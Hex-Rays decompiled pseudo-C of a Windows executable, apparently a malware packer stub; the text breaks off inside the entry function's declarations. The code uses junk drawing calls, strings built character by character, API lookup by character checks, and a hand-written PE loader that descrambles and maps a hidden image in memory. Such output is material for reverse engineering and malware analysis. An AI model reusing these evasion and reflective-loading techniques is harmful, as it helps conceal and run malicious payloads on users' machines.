/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// int __userpurge sub_401010@<eax>(unsigned int a1@<edi>, unsigned int a2);
void __stdcall sub_4011CA(int a1, unsigned int a2, unsigned int a3);
// int __userpurge sub_4011F1@<eax>(int a1@<ebx>, unsigned int a2, _BYTE *a3);
// int __usercall sub_40125C@<eax>(_DWORD *a1@<edi>);
// _BYTE *__usercall sub_4012F0@<eax>(_BYTE *result@<eax>);
int sub_401313();
char *__stdcall sub_401319(char *a1, int a2, int a3);
int __stdcall sub_40146E(char *a1, int (__stdcall **a2)(char *));
// int __usercall sub_401523@<eax>(_BYTE *a1@<eax>, int a2@<ecx>);
// int __userpurge sub_401570@<eax>(int a1@<esi>, int a2);
// _BYTE *__usercall sub_4015C2@<eax>(int a1@<eax>);
// int __userpurge sub_4015F4@<eax>(char **a1@<eax>, int a2@<edi>, int a3, int a4, int a5);
// _BYTE *__usercall sub_401652@<eax>(int a1@<eax>);
// int __userpurge sub_401680@<eax>(int a1@<eax>, int a2);
// _BYTE *__usercall sub_4016D4@<eax>(_BYTE *result@<eax>);
// _BYTE *__usercall sub_4016F0@<eax>(int a1@<eax>);
// BOOL __usercall sub_401722@<eax>(int a1@<edx>, _DWORD *a2@<esi>);
// _BYTE *__usercall sub_4017F7@<eax>(int a1@<eax>);
// unsigned int __userpurge sub_401829@<eax>(int a1@<edi>, _DWORD *a2);
// _DWORD *__userpurge sub_4019CC@<eax>(int a1@<eax>, int a2@<esi>, int a3);
// _BYTE *__userpurge sub_4019F1@<eax>(_BYTE *result@<eax>, _BYTE *a2@<ecx>, int a3);
int __stdcall start(HINSTANCE hInstance, int, int); // idb
HANDLE __stdcall GetKJgkdghkdfhd();
HANDLE __stdcall GetLKfsdgdkhd();
HANDLE __stdcall GetKkgdstkdgkd();
HANDLE __stdcall GetKfldskgdhkd();
HANDLE __stdcall GetKlfgdkgldshd();
// BOOL __stdcall LineTo(HDC hdc, int x, int y);
// BOOL __stdcall DeleteDC(HDC hdc);
// HGDIOBJ __stdcall SelectObject(HDC hdc, HGDIOBJ h);
// HDC __stdcall CreateCompatibleDC(HDC hdc);
// BOOL __stdcall Polyline(HDC hdc, const POINT *apt, int cpt);
// HPEN __stdcall CreatePen(int iStyle, int cWidth, COLORREF color);
// BOOL __stdcall TextOutA(HDC hdc, int x, int y, LPCSTR lpString, int c);
// BOOL __stdcall MoveToEx(HDC hdc, int x, int y, LPPOINT lppt);
// LPSTR __stdcall GetCommandLineA();
// BOOL __stdcall TlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue);
// HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
// BOOL __stdcall TerminateThread(HANDLE hThread, DWORD dwExitCode);
// HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
// BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// HGLOBAL __stdcall GlobalFree(HGLOBAL hMem);
// void __stdcall GetSystemInfo(LPSYSTEM_INFO lpSystemInfo);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// DWORD __stdcall ResumeThread(HANDLE hThread);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// HANDLE __stdcall GetCurrentProcess();
// BOOL __stdcall SetEvent(HANDLE hEvent);
// LRESULT __stdcall SendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL __stdcall InvalidateRect(HWND hWnd, const RECT *lpRect, BOOL bErase);
// BOOL __stdcall ModifyMenuA(HMENU hMnu, UINT uPosition, UINT uFlags, UINT_PTR uIDNewItem, LPCSTR lpNewItem);
// int __stdcall SetScrollInfo(HWND hwnd, int nBar, LPCSCROLLINFO lpsi, BOOL redraw);
// HWND __stdcall FindWindowA(LPCSTR lpClassName, LPCSTR lpWindowName);
// BOOL __stdcall DestroyMenu(HMENU hMenu);
// BOOL __stdcall SetWindowTextA(HWND hWnd, LPCSTR lpString);
// BOOL __stdcall ShowWindow(HWND hWnd, int nCmdShow);
// HACCEL __stdcall LoadAcceleratorsA(HINSTANCE hInstance, LPCSTR lpTableName);
// int __stdcall TranslateAcceleratorA(HWND hWnd, HACCEL hAccTable, LPMSG lpMsg);
// int __stdcall SetScrollPos(HWND hWnd, int nBar, int nPos, BOOL bRedraw);
// int __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// BOOL __stdcall TranslateMessage(const MSG *lpMsg);
// HMENU __stdcall CreateMenu();
// int __stdcall DrawTextA(HDC hdc, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format);
// BOOL __stdcall GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// BOOL __stdcall DestroyWindow(HWND hWnd);
// HDC __stdcall GetDC(HWND hWnd);
// HWND __stdcall GetForegroundWindow();
// int __stdcall ReleaseDC(HWND hWnd, HDC hDC);
// BOOL __stdcall SetWindowPos(HWND hWnd, HWND hWndInsertAfter, int X, int Y, int cx, int cy, UINT uFlags);
// HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);

//-------------------------------------------------------------------------
// Data declarations

const CHAR WindowName[4] = { '\0', '\0', '\0', '\0' }; // idb


//----- (00401010) --------------------------------------------------------
int __userpurge sub_401010@<eax>(unsigned int a1@<edi>, unsigned int a2)
{
  unsigned int v2; // ebp
  unsigned int v3; // esi
  unsigned int v4; // ebx
  HDC v5; // esi
  HDC v6; // esi
  HPEN v7; // eax
  HDC v8; // eax
  HANDLE v9; // eax
  HWND v10; // eax
  char v11; // cl
  unsigned int *v12; // eax
  bool v14; // [esp+Bh] [ebp-19h]
  unsigned int v15; // [esp+Ch] [ebp-18h]

  v2 = 0;
  v3 = 0x40 / a2;
  if ( 0x40 / a2 )
  {
    v14 = 0;
    do
    {
      v4 = v2;
      v15 = v2;
      if ( a1 % 0xA == 30 )
      {
        v5 = GetDC(0);
        MoveToEx(v5, 10, 10, 0);
        TextOutA(v5, 10, 10, "Blablablabla", 32);
        LineTo(v5, 100, 100);
        Polyline(v5, (const POINT *)0x65464, 10);
        ReleaseDC(0, v5);
        v3 = 0x40 / a2;
      }
      else
      {
        v4 = v2 + 8 * v14 + 9;
      }
      if ( a1 % 0xF == 30 )
      {
        v6 = GetDC(0);
        v7 = CreatePen(1, 1, 0xA0A0Au);
        SelectObject(v6, v7);
        v8 = CreateCompatibleDC(v6);
        DeleteDC(v8);
        ReleaseDC(0, v6);
        v3 = 0x40 / a2;
      }
      else if ( v4 > v3 - 1 )
      {
        v4 %= v3;
      }
      if ( a1 % 7 == 25 )
      {
        v9 = CreateEventA(0, 1, 1, "MyEvent");
        SetEvent(v9);
      }
      else
      {
        v14 = !v14;
      }
      if ( a1 % 0x12 == 89 )
      {
        v10 = GetForegroundWindow();
        SetWindowPos(v10, 0, 10, 10, 20, 20, 4u);
      }
      else
      {
        if ( a2 == 1 )
        {
          v11 = *(_BYTE *)(a1 + v2);
          goto LABEL_20;
        }
        v15 = *(_DWORD *)(a1 + 4 * v2);
      }
      if ( a2 != 1 )
      {
        v12 = (unsigned int *)(a1 + 4 * v4);
        *(_DWORD *)(a1 + 4 * v2) = *v12;
        *v12 = v15;
        goto LABEL_22;
      }
      v11 = v15;
LABEL_20:
      *(_BYTE *)(a1 + v2) = *(_BYTE *)(v4 + a1);
      *(_BYTE *)(v4 + a1) = v11;
LABEL_22:
      v2 += 2;
    }
    while ( v2 < v3 );
  }
  return 64;
}

//----- (004011CA) --------------------------------------------------------
void __stdcall sub_4011CA(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int i; // esi

  for ( i = 0; i < a2; i += sub_401010(i + a1, a3) )
    ;
}

//----- (004011F1) --------------------------------------------------------
int __userpurge sub_4011F1@<eax>(int a1@<ebx>, unsigned int a2, _BYTE *a3)
{
  int v3; // esi
  int result; // eax
  _DWORD *v5; // edi
  int v6; // [esp+Ch] [ebp+8h]

  sub_4011CA(a1, a2, 1u);
  sub_4011CA(a1, a2, 4u);
  v3 = a1 + *(_DWORD *)(a1 + 60);
  sub_4019F1(a3, (_BYTE *)a1, *(_DWORD *)(v3 + 84));
  v6 = 0;
  result = *(unsigned __int16 *)(v3 + 20) + v3 + 24;
  if ( *(_WORD *)(v3 + 6) )
  {
    v5 = (_DWORD *)(*(unsigned __int16 *)(v3 + 20) + v3 + 44);
    do
    {
      sub_4019F1(&a3[*(v5 - 2)], (_BYTE *)(a1 + *v5), *(v5 - 1));
      result = *(unsigned __int16 *)(v3 + 6);
      v5 += 10;
      ++v6;
    }
    while ( v6 < result );
  }
  return result;
}

//----- (0040125C) --------------------------------------------------------
int __usercall sub_40125C@<eax>(_DWORD *a1@<edi>)
{
  char *v1; // ecx
  _DWORD *v2; // eax
  int i; // esi
  char *v5; // [esp+0h] [ebp-14h]
  unsigned int v6; // [esp+8h] [ebp-Ch]
  int v7; // [esp+Ch] [ebp-8h]
  _WORD *v8; // [esp+10h] [ebp-4h]

  v1 = (char *)a1 + a1[15];
  v2 = (_DWORD *)((char *)a1 + *((_DWORD *)v1 + 40));
  v5 = (char *)a1 - *((_DWORD *)v1 + 13);
  if ( v2 == a1 )
    return 0;
  v7 = 0;
  for ( i = v2[1]; i; i = v2[1] )
  {
    if ( (unsigned int)(i - 8) >> 1 )
    {
      v8 = v2 + 2;
      v6 = (unsigned int)(i - 8) >> 1;
      do
      {
        if ( (*v8 & 0xF000) == 12288 )
          *(_DWORD *)((char *)a1 + (*v8 & 0xFFF) + *v2) += v5;
        ++v8;
        --v6;
      }
      while ( v6 );
    }
    v7 += i;
    v2 = (_DWORD *)((char *)a1 + v7 + *((_DWORD *)v1 + 40));
  }
  return 1;
}

//----- (004012F0) --------------------------------------------------------
_BYTE *__usercall sub_4012F0@<eax>(_BYTE *result@<eax>)
{
  _BYTE *v1; // ecx
  char v2; // dl

  if ( *result == 1 )
  {
    v1 = ++result;
    if ( *result )
    {
      do
      {
        if ( *v1 )
          v2 = *v1 + 30;
        else
          v2 = 0;
        *v1++ = v2;
      }
      while ( *v1 );
    }
  }
  return result;
}

//----- (00401313) --------------------------------------------------------
int sub_401313()
{
  return 6761486;
}

//----- (00401319) --------------------------------------------------------
char *__stdcall sub_401319(char *a1, int a2, int a3)
{
  int v4; // eax
  bool v5; // zf
  char *v6; // eax
  char *v7; // eax
  unsigned int v8; // ecx
  char *v9; // edi
  char *v10; // ebx
  _BYTE *v11; // edx
  unsigned int v12; // edx
  unsigned int v14; // eax
  unsigned int *v15; // ebx
  unsigned int v16; // ecx
  unsigned int v17; // eax
  char *v18; // eax
  char v19; // dl
  int v20; // eax
  int v21; // [esp+0h] [ebp-24h]
  int v22; // [esp+4h] [ebp-20h]
  unsigned int v23; // [esp+Ch] [ebp-18h]
  unsigned int v24; // [esp+10h] [ebp-14h]
  char *v25; // [esp+14h] [ebp-10h]
  char *v26; // [esp+18h] [ebp-Ch]
  int v27; // [esp+1Ch] [ebp-8h]
  unsigned int v28; // [esp+20h] [ebp-4h]
  unsigned int v29; // [esp+2Ch] [ebp+8h]
  _BYTE *v30; // [esp+2Ch] [ebp+8h]
  char *v31; // [esp+30h] [ebp+Ch]
  int v32; // [esp+30h] [ebp+Ch]

  if ( a1 )
  {
    v4 = *((_DWORD *)a1 + 15);
    v5 = &a1[v4] == 0;
    v6 = &a1[v4];
    v26 = v6;
    if ( !v5 )
    {
      v7 = &a1[*((_DWORD *)v6 + 30)];
      if ( v7 != a1 )
      {
        v25 = &a1[*((_DWORD *)v7 + 9)];
        v8 = *((_DWORD *)v7 + 5);
        v9 = &a1[*((_DWORD *)v7 + 7)];
        v10 = &a1[*((_DWORD *)v7 + 8)];
        v23 = v8;
        v24 = *((_DWORD *)v7 + 6);
        v28 = v8;
        if ( v8 <= v24 )
          v28 = *((_DWORD *)v7 + 6);
        v11 = (_BYTE *)a2;
        if ( a2 >= 0 )
        {
          v14 = 0;
          v29 = 0;
          if ( v28 )
          {
            while ( 1 )
            {
              v27 = *(unsigned __int16 *)&v25[2 * v14];
              if ( v14 >= v24 || *(unsigned __int16 *)&v25[2 * v14] >= v23 )
                break;
              if ( sub_401523(v11, (int)&a1[*(_DWORD *)&v10[4 * v29]]) )
              {
                v15 = (unsigned int *)&v9[4 * v27];
                v16 = *v15;
                v17 = *((_DWORD *)v26 + 30);
                if ( *v15 < v17 || v16 >= v17 + *((_DWORD *)v26 + 31) )
                  return &a1[v16];
                v18 = &a1[v16];
                do
                {
                  v19 = *v18++;
                  v31 = v18;
                }
                while ( v19 != 46 );
                v30 = (_BYTE *)(*(int (__stdcall **)(_DWORD, int, int, int))(a3 + 8))(0, &v18[-v16] - a1, 12288, 4);
                if ( v30 )
                {
                  sub_4019F1(v30, &a1[*v15], &v31[-*v15] - a1 - 1);
                  v20 = (*(int (__stdcall **)(_BYTE *, char *, int))a3)(v30, v31, a3);
                  v32 = sub_401319(v20, v21, v22);
                  (*(void (__stdcall **)(_BYTE *))(a3 + 12))(v30);
                  return (char *)v32;
                }
                return 0;
              }
              if ( ++v29 >= v28 )
                return 0;
              v11 = (_BYTE *)a2;
              v14 = v29;
            }
          }
        }
        else
        {
          v12 = (a2 & 0x7FFFFFFF) - *((_DWORD *)v7 + 4);
          if ( v12 < v8 )
            return &a1[*(_DWORD *)&v9[4 * v12]];
        }
      }
    }
  }
  return 0;
}
// 401445: variable 'v21' is possibly undefined
// 401445: variable 'v22' is possibly undefined

//----- (0040146E) --------------------------------------------------------
int __stdcall sub_40146E(char *a1, int (__stdcall **a2)(char *))
{
  char *v2; // edx
  char *v3; // esi
  char *v5; // edi
  char *v6; // ebx
  unsigned int v7; // eax
  char **v8; // ecx
  char *v9; // eax
  char *v10; // ecx
  char *v11; // eax
  int v12; // [esp-10h] [ebp-24h]
  char **v13; // [esp+4h] [ebp-10h]
  int v14; // [esp+8h] [ebp-Ch]
  unsigned int v15; // [esp+Ch] [ebp-8h]
  unsigned int v16; // [esp+10h] [ebp-4h]

  v2 = a1;
  v3 = &a1[*(_DWORD *)&a1[*((_DWORD *)a1 + 15) + 120]];
  v14 = (int)&a1[*((_DWORD *)a1 + 15) + 120];
  if ( v3 == a1 )
    return 1;
  v5 = &a1[*((_DWORD *)v3 + 7)];
  v6 = &a1[*((_DWORD *)v3 + 9)];
  v15 = *((_DWORD *)v3 + 5);
  if ( v15 <= *((_DWORD *)v3 + 6) )
    v15 = *((_DWORD *)v3 + 6);
  v7 = 0;
  v16 = 0;
  if ( v15 )
  {
    while ( 1 )
    {
      if ( v7 < *((_DWORD *)v3 + 5) )
        v7 = *(unsigned __int16 *)&v6[2 * v7];
      v8 = (char **)&v5[4 * v7];
      v9 = &(*v8)[(_DWORD)v2];
      v13 = v8;
      if ( v9 != v2 )
      {
        if ( v9 > v3 )
        {
          if ( v9 < &v3[40 * *(_DWORD *)(v14 + 4)] )
          {
            v10 = &(*v8)[(_DWORD)v2];
            do
              ++v10;
            while ( *v10 != 46 );
            *v10 = 0;
            v12 = (int)(v10 + 1);
            v11 = (char *)(*a2)(v9);
            v9 = sub_401319(v11, v12, (int)a2);
            v8 = v13;
          }
          v2 = a1;
        }
        if ( !v9 )
          return 0;
        *v8 = v9;
      }
      if ( ++v16 >= v15 )
        return 1;
      v7 = v16;
    }
  }
  return 1;
}

//----- (00401523) --------------------------------------------------------
int __usercall sub_401523@<eax>(_BYTE *a1@<eax>, int a2@<ecx>)
{
  bool v2; // bl
  int v3; // esi
  int v4; // edx
  char v5; // cl
  bool v6; // zf

  v2 = *a1 == 1;
  if ( *a1 == 1 )
    ++a1;
  if ( *a1 == 2 )
    return 1;
  v3 = a2 - (_DWORD)a1;
  while ( 1 )
  {
    if ( v2 )
    {
      v4 = (char)*a1;
      if ( *a1 )
        v4 += 30;
      v5 = a1[v3];
      v6 = v5 == v4;
    }
    else
    {
      v5 = a1[v3];
      v6 = v5 == *a1;
    }
    if ( !v6 )
      break;
    if ( v5 )
    {
      if ( *++a1 != 2 )
        continue;
    }
    return 1;
  }
  return 0;
}

//----- (00401570) --------------------------------------------------------
int __userpurge sub_401570@<eax>(int a1@<esi>, int a2)
{
  _DWORD *v2; // eax
  _DWORD *v4; // ebx
  char **v5; // eax
  int v6; // [esp-14h] [ebp-14h]
  int v7; // [esp-10h] [ebp-10h]

  v2 = (_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)(a1 + 60) + a1 + 128));
  if ( v2 == (_DWORD *)a1 )
    return 1;
  if ( !*v2 )
    return 1;
  v4 = (_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)(a1 + 60) + a1 + 128));
  while ( 1 )
  {
    v7 = a1 + *v4;
    v5 = (char **)(a1 + v4[4]);
    v6 = a1 + v4[3];
    v4 += 5;
    if ( !sub_4015F4(v5, a2, v6, v7, a1) )
      break;
    if ( !*v4 )
      return 1;
  }
  return 0;
}

//----- (004015C2) --------------------------------------------------------
_BYTE *__usercall sub_4015C2@<eax>(int a1@<eax>)
{
  _BYTE *result; // eax

  result = (_BYTE *)(*(int (__stdcall **)(_DWORD, int, int, int))(a1 + 8))(0, 9, 12288, 4);
  result[8] = 2;
  result[1] = 111;
  result[3] = 98;
  result[6] = 101;
  result[2] = 109;
  result[5] = 110;
  *result = 67;
  result[7] = 82;
  result[4] = 105;
  return result;
}

//----- (004015F4) --------------------------------------------------------
int __userpurge sub_4015F4@<eax>(char **a1@<eax>, int a2@<edi>, int a3, int a4, int a5)
{
  int result; // eax
  int v7; // ebx
  int *v8; // ecx
  int v9; // eax
  char *v10; // eax
  char *v11; // [esp+Ch] [ebp+8h]

  result = (*(int (__stdcall **)(int))(a2 + 16))(a3);
  v11 = (char *)result;
  if ( result )
  {
    v7 = a4 - (_DWORD)a1;
    while ( 1 )
    {
      v8 = (int *)((char *)a1 + v7);
      v9 = 0;
      if ( (char **)((char *)a1 + v7) )
        v9 = *v8;
      if ( !a1 || !*a1 )
        return 1;
      if ( v8 )
      {
        if ( v9 >= 0 )
          v9 += a5 + 2;
        v10 = sub_401319(v11, v9, a2);
        if ( !v10 )
          return 0;
        *a1 = v10;
      }
      ++a1;
    }
  }
  return result;
}

//----- (00401652) --------------------------------------------------------
_BYTE *__usercall sub_401652@<eax>(int a1@<eax>)
{
  _BYTE *result; // eax

  result = (_BYTE *)(*(int (__stdcall **)(_DWORD, int, int, int))(a1 + 8))(0, 8, 12288, 4);
  *result = 67;
  result[7] = 2;
  result[2] = 101;
  result[5] = 101;
  result[3] = 97;
  result[1] = 114;
  result[6] = 82;
  result[4] = 116;
  return result;
}

//----- (00401680) --------------------------------------------------------
int __userpurge sub_401680@<eax>(int a1@<eax>, int a2)
{
  int v2; // esi
  unsigned int v3; // ebx
  _DWORD *v4; // edi
  int v6; // [esp+Ch] [ebp+8h]

  v2 = a1 + *(_DWORD *)(*(_DWORD *)(a1 + 60) + a1 + 136);
  if ( v2 != a1 )
  {
    v6 = a1 - a2;
    if ( v6 )
    {
      v3 = 0;
      if ( *(_WORD *)(v2 + 14) )
      {
        v4 = (_DWORD *)(v2 + 20);
        do
        {
          sub_4019CC((*v4 & 0x7FFFFFFF) + v2 + 16, v2, v6);
          v4 += 2;
          ++v3;
        }
        while ( v3 < *(unsigned __int16 *)(v2 + 14) );
      }
    }
  }
  return 1;
}

//----- (004016D4) --------------------------------------------------------
_BYTE *__usercall sub_4016D4@<eax>(_BYTE *result@<eax>)
{
  *result = 71;
  result[1] = 101;
  result[5] = 103;
  result[6] = 2;
  result[2] = 116;
  result[4] = 101;
  result[3] = 82;
  return result;
}

//----- (004016F0) --------------------------------------------------------
_BYTE *__usercall sub_4016F0@<eax>(int a1@<eax>)
{
  _BYTE *result; // eax

  result = (_BYTE *)(*(int (__stdcall **)(_DWORD, int, int, int))(a1 + 8))(0, 10, 12288, 4);
  result[7] = 108;
  result[6] = 100;
  result[3] = 51;
  result[8] = 108;
  *result = 103;
  result[1] = 100;
  result[4] = 50;
  result[5] = 46;
  result[2] = 105;
  return result;
}

//----- (00401722) --------------------------------------------------------
BOOL __usercall sub_401722@<eax>(int a1@<edx>, _DWORD *a2@<esi>)
{
  int v3; // edi
  int *v4; // ecx
  int *v5; // eax
  int v6; // ebx
  int v7; // ecx
  _DWORD *v8; // eax
  int v9; // ecx
  int v10; // ebx
  _BYTE *v11; // ebx
  int (__stdcall *v12)(char *); // eax
  int v13; // eax
  char v14[16]; // [esp+0h] [ebp-10h] BYREF

  if ( a1 + *(_DWORD *)(*(_DWORD *)(a1 + 60) + a1 + 128) == a1 )
    return 0;
  v3 = 0;
  v4 = (int *)(a1 + *(_DWORD *)(*(_DWORD *)(a1 + 60) + a1 + 128));
  do
  {
    if ( !*v4 )
      return 0;
    v5 = v4;
    v6 = v4[3];
    v4 += 5;
  }
  while ( *(_BYTE *)(a1 + v6) != 75 );
  v7 = *v5;
  v8 = (_DWORD *)(a1 + v5[4]);
  v9 = a1 + v7;
  if ( !*v8 )
    return 0;
  while ( 1 )
  {
    v10 = *(_DWORD *)(v9 + 4 * v3);
    if ( v10 >= 0 )
    {
      v11 = (_BYTE *)(a1 + v10);
      if ( v11[2] == 71 && v11[3] == 101 && v11[5] == 77 && v11[11] == 72 )
        break;
    }
    if ( !v8[++v3] )
      return 0;
  }
  v12 = (int (__stdcall *)(char *))v8[v3];
  strcpy(v14, "Kernel32.dll");
  v13 = v12(v14);
  sub_401829(v13, a2);
  return *a2 && a2[4] && a2[2] && a2[3] && a2[1] && a2[5];
}

//----- (004017F7) --------------------------------------------------------
_BYTE *__usercall sub_4017F7@<eax>(int a1@<eax>)
{
  _BYTE *result; // eax

  result = (_BYTE *)(*(int (__stdcall **)(_DWORD, int, int, int))(a1 + 8))(0, 9, 12288, 4);
  result[7] = 111;
  result[8] = 2;
  result[4] = 116;
  *result = 67;
  result[1] = 114;
  result[2] = 101;
  result[3] = 97;
  result[5] = 101;
  result[6] = 82;
  return result;
}

//----- (00401829) --------------------------------------------------------
unsigned int __userpurge sub_401829@<eax>(int a1@<edi>, _DWORD *a2)
{
  _DWORD *v2; // ecx
  int v3; // esi
  int v4; // ebx
  unsigned int result; // eax
  unsigned int v6; // edx
  _BYTE *v7; // eax
  int v8; // esi
  int v9; // [esp+8h] [ebp-18h]
  int v10; // [esp+Ch] [ebp-14h]
  int v11; // [esp+10h] [ebp-10h]
  unsigned int v12; // [esp+14h] [ebp-Ch]
  unsigned int v13; // [esp+18h] [ebp-8h]
  unsigned int v14; // [esp+1Ch] [ebp-4h]

  v2 = (_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)(a1 + 60) + a1 + 120));
  v9 = a1 + v2[9];
  v3 = a1 + v2[7];
  v4 = a1 + v2[8];
  v11 = v3;
  v10 = v4;
  v12 = v2[5];
  if ( v12 <= v2[6] )
    v12 = v2[6];
  result = 0;
  v14 = 0;
  v13 = 0;
  if ( v12 )
  {
    while ( 1 )
    {
      if ( v14 >= 6 )
        return result;
      v6 = *(unsigned __int16 *)(v9 + 2 * result);
      if ( result >= v2[6] || v6 >= v2[5] )
        return result;
      v7 = (_BYTE *)(a1 + *(_DWORD *)(v4 + 4 * result));
      v8 = a1 + *(_DWORD *)(v3 + 4 * v6);
      if ( *v7 == 71 && v7[1] == 101 )
      {
        if ( v7[2] == 116 && v7[3] == 77 && v7[15] == 65 )
        {
          *a2 = v8;
LABEL_47:
          ++v14;
          goto LABEL_48;
        }
        if ( v7[2] == 116 && v7[3] == 84 && v7[4] == 105 && v7[5] == 99 && v7[7] == 67 && v7[11] == 116 && !v7[12] )
        {
          a2[5] = v8;
          goto LABEL_47;
        }
      }
      if ( *v7 == 86 && v7[1] == 105 )
      {
        if ( v7[2] == 114 && v7[7] == 65 && v7[8] == v7[9] && !v7[12] )
        {
          a2[2] = v8;
          goto LABEL_47;
        }
        if ( v7[2] == 114 && v7[7] == 80 && v7[8] == 114 && !v7[14] )
        {
          a2[1] = v8;
          goto LABEL_47;
        }
        if ( v7[2] == 114 && v7[7] == 70 && v7[9] == v7[10] && !v7[11] )
        {
          a2[3] = v8;
          goto LABEL_47;
        }
      }
      if ( *v7 == 76 && v7[1] == 111 && v7[2] == 97 && v7[3] == 100 && v7[4] == 76 && v7[11] == 65 )
      {
        a2[4] = v8;
        goto LABEL_47;
      }
LABEL_48:
      result = ++v13;
      if ( v13 >= v12 )
        return result;
      v3 = v11;
      v4 = v10;
      result = v13;
    }
  }
  return result;
}
// 4018D9: conditional instruction was optimized away because of 'dl.1==65'
// 401942: conditional instruction was optimized away because of 'dl.1==69'
// 401967: conditional instruction was optimized away because of 'dl.1==69'

//----- (004019CC) --------------------------------------------------------
_DWORD *__userpurge sub_4019CC@<eax>(int a1@<eax>, int a2@<esi>, int a3)
{
  int v3; // ecx
  _DWORD *result; // eax

  while ( 1 )
  {
    v3 = *(_DWORD *)(a1 + 4);
    if ( (v3 & 0x80000000) == 0 )
      break;
    a1 = (v3 & 0x7FFFFFFF) + a2 + 16;
  }
  result = (_DWORD *)(a2 + *(_DWORD *)(a1 + 4));
  *result += a3;
  return result;
}

//----- (004019F1) --------------------------------------------------------
_BYTE *__userpurge sub_4019F1@<eax>(_BYTE *result@<eax>, _BYTE *a2@<ecx>, int a3)
{
  while ( a3 )
  {
    --a3;
    *result++ = *a2++;
  }
  return result;
}

//----- (00401A07) --------------------------------------------------------
int __stdcall start(HINSTANCE hInstance, int a2, int a3)
{
  const char *v3; // edx
  unsigned int v4; // eax
  int v5; // edi
  unsigned int v7; // eax
  int v8; // edi
  HMODULE v10; // edi
  HWND v11; // edi
  signed int i; // esi
  char *v14; // edi
  HWND v15; // eax
  char *v16; // eax
  HWND v17; // edi
  int v18; // eax
  HMENU v19; // eax
  _BYTE *v20; // eax
  HDC v21; // eax
  char *v22; // eax
  int *v23; // ecx
  unsigned int v24; // eax
  DWORD *v25; // eax
  DWORD v26; // edi
  DWORD v27; // esi
  HWND v28; // eax
  HMODULE v29; // eax
  HANDLE v30; // eax
  HWND v31; // esi
  HANDLE v32; // eax
  char *v33; // esi
  char *v34; // eax
  HANDLE v35; // eax
  char *v36; // eax
  HGLOBAL v37; // eax
  void *v38; // esi
  char *v39; // esi
  char *v40; // edi
  char *v41; // ebx
  int v42; // esi
  unsigned int v43; // ecx
  __int16 v44; // ax
  char *v45; // edx
  _DWORD *v46; // eax
  char *v47; // ebx
  char *v48; // eax
  int v49; // [esp+0h] [ebp-118h]
  int v50; // [esp+4h] [ebp-114h]
  int v51; // [esp+8h] [ebp-110h]
  LPARAM lParam; // [esp+Ch] [ebp-10Ch] BYREF
  int v53[10]; // [esp+10h] [ebp-108h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+38h] [ebp-E0h] BYREF
  int v55; // [esp+5Ch] [ebp-BCh]
  char *v56; // [esp+60h] [ebp-B8h]
  _BYTE *v57; // [esp+64h] [ebp-B4h]
  int v58; // [esp+68h] [ebp-B0h]
  int v59; // [esp+6Ch] [ebp-ACh]
  int v60; // [esp+70h] [ebp-A8h]
  DWORD ThreadId; // [esp+74h] [ebp-A4h] BYREF
  DWORD dwExitCode; // [esp+78h] [ebp-A0h]
  int v63; // [esp+7Ch] [ebp-9Ch]
  unsigned int v64; // [esp+80h] [ebp-98h]
  int v65; // [esp+84h] [ebp-94h]
  unsigned int v66; // [esp+88h] [ebp-90h]
  int v67; // [esp+8Ch] [ebp-8Ch]
  int v68; // [esp+90h] [ebp-88h]
  HWND v69; // [esp+94h] [ebp-84h]
  char *v70; // [esp+98h] [ebp-80h]
  char v71[7]; // [esp+9Ch] [ebp-7Ch] BYREF
  char v72[4]; // [esp+A3h] [ebp-75h] BYREF
  char v73[12]; // [esp+A8h] [ebp-70h] BYREF
  unsigned int v74; // [esp+B4h] [ebp-64h]
  int (__stdcall *v75)(char *); // [esp+B8h] [ebp-60h] BYREF
  void (__stdcall *v76)(char *, unsigned int, int, int *); // [esp+BCh] [ebp-5Ch]
  char *v77; // [esp+C0h] [ebp-58h]
  void (__stdcall *v78)(HWND, _DWORD, int); // [esp+C4h] [ebp-54h]
  int (__stdcall *v79)(HWND); // [esp+C8h] [ebp-50h]
  int v80; // [esp+D0h] [ebp-48h]
  int v81; // [esp+D4h] [ebp-44h]
  HACCEL hAccTable; // [esp+D8h] [ebp-40h]
  int v83; // [esp+DCh] [ebp-3Ch] BYREF
  HWND v84; // [esp+E0h] [ebp-38h]
  int v85; // [esp+E4h] [ebp-34h]
  char *v86; // [esp+E8h] [ebp-30h]
  char *v87; // [esp+ECh] [ebp-2Ch]
  HWND hWndParent; // [esp+F0h] [ebp-28h]
  HWND hWnd; // [esp+F4h] [ebp-24h]
  HWND v90; // [esp+F8h] [ebp-20h] BYREF
